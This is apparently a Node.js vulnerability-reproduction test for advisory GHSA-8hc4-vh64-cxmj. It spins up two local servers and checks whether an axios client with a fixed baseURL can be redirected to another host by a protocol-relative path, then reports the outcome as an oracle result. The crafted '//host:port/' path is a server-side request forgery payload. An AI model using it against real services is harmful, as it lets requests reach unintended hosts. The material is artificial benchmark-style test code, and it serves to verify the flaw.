let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

(async () => {
  const http = require('node:http');
  const os = require('node:os');
  const path = require('node:path');

  const marker = 'ghsa-8hc4-vh64-cxmj-' + Date.now() + '-' + Math.random().toString(16).slice(2);

  let goodServer;
  let badServer;

  function listen(server) {
    return new Promise((resolve, reject) => {
      server.once('error', reject);
      server.listen(0, '127.0.0.1', () => {
        server.removeListener('error', reject);
        resolve(server.address().port);
      });
    });
  }

  function closeServer(server) {
    return new Promise((resolve) => {
      if (!server) return resolve();
      server.close(() => resolve());
    });
  }

  try {
    const axiosMod = require('axios');
    const axios = axiosMod && axiosMod.default ? axiosMod.default : axiosMod;

    goodServer = http.createServer((req, res) => {
      res.statusCode = 200;
      res.setHeader('Content-Type', 'text/plain');
      res.end('good:' + marker + ':' + req.url);
    });

    badServer = http.createServer((req, res) => {
      res.statusCode = 200;
      res.setHeader('Content-Type', 'text/plain');
      res.end('bad:' + marker + ':' + req.url);
    });

    const goodPort = await listen(goodServer);
    const badPort = await listen(badServer);

    const client = axios.create({ baseURL: 'http://127.0.0.1:' + String(goodPort) });

    const benignResp = await client.get('/ok');
    if (!benignResp || typeof benignResp.data !== 'string' || !benignResp.data.startsWith('good:' + marker + ':')) {
      throw new Error('benign_response_unexpected');
    }

    operation_completed = true;

    const maliciousPath = '//' + '127.0.0.1:' + String(badPort) + '/';
    try {
      const malResp = await client.get(maliciousPath);
      const body = malResp && typeof malResp.data === 'string' ? malResp.data : '';
      exploit_succeeded = body.startsWith('bad:' + marker + ':');
      evidence = 'tmp=' + path.join(os.tmpdir(), marker) + ';goodPort=' + goodPort + ';badPort=' + badPort + ';body=' + body;
    } catch (err) {
      exploit_succeeded = false;
      evidence = 'tmp=' + path.join(os.tmpdir(), marker) + ';goodPort=' + goodPort + ';badPort=' + badPort + ';blocked=' + (err && err.message ? err.message : String(err));
    }
  } catch (err) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup_or_benign_failed:' + (err && err.message ? err.message : String(err));
  } finally {
    await closeServer(goodServer);
    await closeServer(badServer);
    console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
  }
})();
